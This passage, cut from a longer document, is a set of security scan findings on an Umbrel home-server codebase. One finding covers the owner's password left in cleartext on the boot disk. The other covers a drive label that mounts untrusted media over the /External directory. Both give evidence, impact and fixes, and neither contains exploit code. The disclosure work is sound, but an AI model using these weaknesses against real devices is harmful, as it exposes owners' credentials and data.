Impact: anyone who can read the boot disk (physical possession of the device or of the boot drive, e.g. a resold/repaired/stolen Umbrel Pro or a removed boot SSD) obtains the owner's account password in cleartext, which grants owner login to the device over LAN/Tailscale/Tor and, given common password reuse, may compromise other accounts. The ZFS data set itself is encrypted only with the fixed public passphrase 'umbrelumbrel', so data-at-rest confidentiality against a physical attacker is already acknowledged as absent; the additional exposure here is the owner's secret credential, which bcrypt hashing elsewhere (user.ts #hashPassword) is specifically meant to protect.

## Evidence
1. [packages/umbreld/source/modules/hardware/raid.ts:1131–1134](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/hardware/raid.ts#L1131-L1134)
   triggerInitialRaidSetupBootFlow stores the registration object {name, password, language} - the plaintext password - into the FAT config partition /run/rugix/mounts/config/umbrel.yaml via configStore.set('user', user).
2. [packages/umbreld/source/modules/hardware/raid.ts:482–487](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/hardware/raid.ts#L482-L487)
   The FileStore onAfterWrite hook copies the config file (including the plaintext password at this point) to ${dataDirectory}/umbrel-boot-config.yaml. Before the first RAID boot /home/umbrel/umbrel lives under rugix-persisted /data (umbrelos.Dockerfile:618-620, state-data.toml persist=/data) on the boot disk's ext4 data partition, so a cleartext copy lands there.
3. [packages/umbreld/source/modules/hardware/raid.ts:1151–1167](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/hardware/raid.ts#L1151-L1167)
   On the next boot the plaintext is deleted only from the config partition (configStore.delete('user.password')), only inside the branch that runs when register succeeds and no user exists yet. The ext4 copy is never touched. If umbreld crashes/loses power between user.register and the delete, user exists on the next boot so the branch is skipped and the plaintext stays in the config partition and in the pool copy forever; if register keeps failing it also stays.
4. [packages/os/overlay/opt/umbrel-data/umbrel-data-mount:147–148](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/overlay/opt/umbrel-data/umbrel-data-mount#L147-L148)
   Once a RAID config exists the boot script mounts only the ZFS dataset as the data mount; the boot disk's ext4 data partition is no longer mounted, so the cleartext copy written there before the reboot is orphaned and never rewritten or cleaned.
5. [packages/os/overlay/opt/umbrel-data/umbrel-data-mount:173–188](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/overlay/opt/umbrel-data/umbrel-data-mount#L173-L188)
   Shows that before RAID setup the data mount (and thus ${dataDirectory}) is the default ext4 partition on the boot disk - the destination of the cleartext copy.
6. [packages/os/rugix/recipes/setup-rugix/files/hooks/state-reset/prepare.sh:61–63](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/rugix/recipes/setup-rugix/files/hooks/state-reset/prepare.sh#L61-L63)
   The only code path that ever erases the boot-disk data partition is the factory-reset hook's mkfs.ext4; normal operation never removes the cleartext credential.
7. [packages/umbreld/source/modules/user/routes.ts:71–85](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/user/routes.ts#L71-L85)
   The password forwarded to the RAID flow is the owner's chosen account password, i.e. the credential that grants owner login over the network.

## Impact
Confidentiality: the owner's cleartext account password is disclosed - the credential that authenticates the owner to umbreld over the network and that bcrypt hashing is meant to keep secret. Integrity/availability are not directly affected by the disclosure itself (the attacker already holds the hardware in this position).

## Reproduction steps
1. The attacker needs read access to the boot disk's ext4 data partition (or the FAT config partition in the failure cases): physical possession of the device or its boot drive, e.g. after resale, repair, theft or disposal. No credentials or user interaction are needed; the file is a plain YAML at a fixed path. No defensive mechanism (encryption, wiping) stands in the way, so the read succeeds deterministically on every RAID-configured device.

## Recommended fix
1. The plaintext registration password is persisted to disk (config partition) and, via the onAfterWrite copy, to the boot-disk data partition, and the copy is never cleaned up because the partition is unmounted after the first RAID boot. Fix criteria: The owner's password must never be written to persistent storage in cleartext: hash it before persisting (the first-boot registration can accept a pre-hashed credential), or carry it only in volatile memory/kernel keyring across the reboot. Verify: after RAID onboarding, neither the config partition, the boot-disk ext4 partition nor the pool contains the password in cleartext.
2. The cleanup of user.password runs only in the success branch of handlePostBootRaidSetupProcess, so a crash after register or a failing register leaves the plaintext in place indefinitely. Fix criteria: Any cleartext credential still present on the config partition or boot-config copies must be removed unconditionally on every start, independent of whether register succeeded or a user already exists, and the onAfterWrite copy must not propagate a cleartext password. Verify: killing umbreld between register and delete leaves no cleartext password after the next boot.

---
**Severity:** LOW
**Status:** Open
**Category:** Plaintext password storage
**CWE:** [CWE-256](https://cwe.mitre.org/data/definitions/256.html)
**Attack vector:** PHYSICAL
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5257926

---

# External drive label sanitising to empty string mounts the drive over the /External base directory

## Details
`ExternalStorage.#mountExternalDevices()` (external-storage.ts:228-268) names each partition's mountpoint after its filesystem label after stripping every character not in `[a-zA-Z0-9 '_-]`. The code assumes the result is a non-empty child name under `<dataDir>/external`, but a label made solely of other characters (CJK/Cyrillic/accented-only text, emoji, `..`), or one that `.trim()` (line 103) reduces to '', sanitises to the empty string, and `nodePath.join(base, '')` is the base directory itself.

The subsequent logic then treats the base as a stale leftover mountpoint: when no other external drive is mounted the base is empty and not a mountpoint, so `fse.remove(systemMountpoint)` deletes `<dataDir>/external`; `getUniqueName()` returns the now-missing base; `ensureDir`/`chownSystemPath` recreate it; and `mount /dev/<part> <dataDir>/external` mounts the foreign filesystem directly on the `/External` virtual root (`systemToVirtualPath(base)` yields `/External`, so no containment check fails). If another drive is already mounted, `getUniqueName()` yields `<dataDir>/external (2)` and `systemToVirtualPath` throws, so the partition is merely not mounted.

Effects once the foreign filesystem is the `/External` root, which files.ts (236-238, 1846, 1914) deliberately treats as a read-only, umbreld-owned container of per-drive mountpoints: `#cleanLeftOverMountPoints()` (601-624), which runs on startup, after any mount failure and after every unmount, enumerates the drive's top-level entries and `fse.remove()`s each empty directory, silently deleting the user's empty folders on the media; later partitions/drives are mounted inside the first drive's filesystem (their mountpoint directories are created on it); unmounting the first drive while another is nested under it fails with `[failed-unmounts]`, and a yanked outer drive leaves a stale mount at the base that `#detachDisconnectedMountPoints()` never inspects (it only looks at children), leaving external storage stuck until reboot.

No confidentiality impact: app data roots and cloud destinations are pinned by filesystem UUID (`isExternalFilesystemMountedAt`, `getExternalStorageFilesystemType`), and a same-labelled drive can already occupy any single `/External/<name>` through the sanctioned path, so content substitution is not a gain here. The input is media metadata (an inserted USB drive's label) processed without authentication by the `system:disk:change` listener, so the vector is PHYSICAL. The sibling `formatExternalDevice` enforces `^[A-Za-z0-9-_ ]+$` on labels it creates (line 449), but drives formatted elsewhere are not constrained.

## Evidence
1. [packages/umbreld/source/modules/files/external-storage.ts:228–244](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/external-storage.ts#L228-L244)
   The mountpoint is derived as nodePath.join(externalBase, label.replace(/[^a-zA-Z0-9 '_\-]/g, '')). A label consisting only of characters outside that class sanitises to '' and nodePath.join(base, '') === base. The 'stale leftover' branch then sees base exists, is empty (no other drive mounted) and is not a mountpoint, and calls fse.remove(base), deleting the /External base directory, after which getUniqueName(base) returns base itself (files.ts:2020-2035) and systemToVirtualPath(base) returns '/External' (files.ts:2271-2291).
2. [packages/umbreld/source/modules/files/external-storage.ts:253–267](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/external-storage.ts#L253-L267)
   ensureDir/chown recreate the base and `mount /dev/<part> <base>` mounts the inserted filesystem directly on '<dataDir>/external', so the virtual root '/External' becomes the drive's root rather than a child mountpoint.
3. [packages/umbreld/source/modules/files/external-storage.ts:601–623](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/external-storage.ts#L601-L623)
   #cleanLeftOverMountPoints() iterates readdir(base) and fse.remove()s every empty, non-mounted child. With the drive mounted on base, this runs against the drive's own top-level directories on startup, on every later mount failure and after every unmount, deleting the user's empty folders; later drives are also mounted inside the first drive's filesystem and the outer unmount then fails with [failed-unmounts].
4. [packages/umbreld/source/modules/files/external-storage.ts:100–107](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/external-storage.ts#L100-L107)
   getBlockDevices() takes the label verbatim from lsblk (only trimmed, so a whitespace-only label also becomes ''), so any Unicode/symbol label on an inserted drive reaches the sanitiser; only null labels fall back to 'Untitled'.
5. [packages/umbreld/source/modules/files/files.ts:236–238](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L236-L238)
   Files creates the /External root as a umbreld-owned directory and treats it as read-only in the virtual filesystem (see also the isReadonly/isProtected rules at 1846 and 1914); the finding breaks this invariant by replacing the root with untrusted media.

## Impact
The umbreld-owned /External base directory is deleted and replaced by the inserted filesystem; the leftover-cleanup routine then removes empty directories on that media on every startup, unmount and mount failure, later drives nest inside it, and unmount of the outer drive fails, leaving external storage stuck until reboot. No confidentiality impact: app data roots and cloud destinations are UUID-pinned and nothing outside the external namespace is exposed.

## Reproduction steps
1. Anyone able to insert a USB drive into the device, or anyone who hands the owner a drive they formatted, triggers the path automatically via the `system:disk:change` listener (dbus.ts:31-40, external-storage.ts:154) with no authentication or dashboard interaction. The precondition that no other external drive is currently mounted is the common single-drive case; otherwise the partition is silently not mounted.

## Recommended fix
The label-derived mountpoint name is not validated to be a non-empty, single path component strictly below the /External base, so the base itself can be selected, removed and mounted over. Fix criteria: After sanitising, fall back to a safe default (e.g. 'Untitled') whenever the result is empty or not a single, non-dot path component, and assert that the computed mountpoint's dirname equals the /External base before any remove/mount call. Verify that a partition labelled only with non-ASCII characters mounts at /External/Untitled (or a numbered variant) and that the base directory is never removed or used as a mount target.

---
**Severity:** LOW
**Status:** Open
**Category:** Improper input validation
**CWE:** [CWE-20](https://cwe.mitre.org/data/definitions/20.html)
**Attack vector:** PHYSICAL
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5257916